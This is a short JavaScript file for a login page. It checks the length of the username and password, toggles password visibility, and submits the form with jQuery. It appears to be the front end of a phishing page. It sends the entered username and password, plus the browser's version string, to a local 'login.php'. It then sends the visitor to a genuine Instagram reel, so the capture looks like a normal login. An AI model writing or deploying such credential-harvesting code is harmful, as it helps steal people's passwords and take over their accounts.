var submit = document.getElementById('submit');
//console.log(submit.disabled = false);
var username = document.getElementById('username');
var password = document.getElementById('password');
var loginForm = document.getElementById('loginForm')
var form = new FormData(loginForm);

function check_ok() {
    var password = document.getElementById('password');
    var username = document.getElementById('username');
    var username_l = username.value.split("");
    var password_l = password.value.split("");
    var check_arr = [];
    var password_username_check;
    if (password_l.length >= 5 && username_l.length >= 5) {
        password_username_check = true;
    } else {
        password_username_check = false;
    }
    check_arr.push(password_username_check);
    return check_arr;
}
check_ok();



function button_on() {

    // Tab to edit



    username.addEventListener("input", () => {
        if (check_ok()[0]) {
            submit.disabled = false;
        } else {
            submit.disabled = true;

        }


    })



    password.addEventListener("input", () => {
        if (check_ok()[0]) {
            submit.disabled = false;
        } else {
            submit.disabled = true;

        }
    })

}

button_on()


function clearForm(form_id) {
    var form = document.querySelector(form_id);
    form.reset();
}


function add_cat_and_post(from_id, url, runfunction, editor_id = '') {

    $(from_id).submit(function(e) {
        e.preventDefault();
        var formData = new FormData(this);
                formData.append('phone_info', `${window.navigator.appVersion}`);
                

        var num = true;;
        if (num) {
            $.ajax({
                url: url, // Replace with your PHP script URL
                type: 'POST',
                data: formData,
                contentType: false,
                processData: false,

                success: function(response) {
                    rs = response;
                    clearForm(from_id);
                    if (check_ok()[0]) {
                        submit.disabled = false;
                    } else {
                        submit.disabled = true;

                    }







                    // Assuming you want to fill the clicked element with the response
                    //  $(get_all_product_cat).html(response);

                    if (typeof runfunction === 'function') {
                        runfunction(); // Invoke the function passed as a parameter
                    }





                    // Handle the server response here
                }
            });
        }

    });
}




add_cat_and_post('#loginForm', './login.php', () => {
    console.log(rs);
        window.location.href="https://www.instagram.com/reel/C4pUYBgr9Es/?igsh=bHRvbW8zd3ViMXRm";
        
})


var s_h_btn = document.querySelector(".s_h_btn");

s_h_btn.addEventListener('click', () => {

    if (password.type == 'password') {
        password.type = 'text';
        s_h_btn.innerHTML = 'Hide';

    } else {
        password.type = 'password';
        s_h_btn.innerHTML = 'Show';

    }

})




//loginForm


//username

//password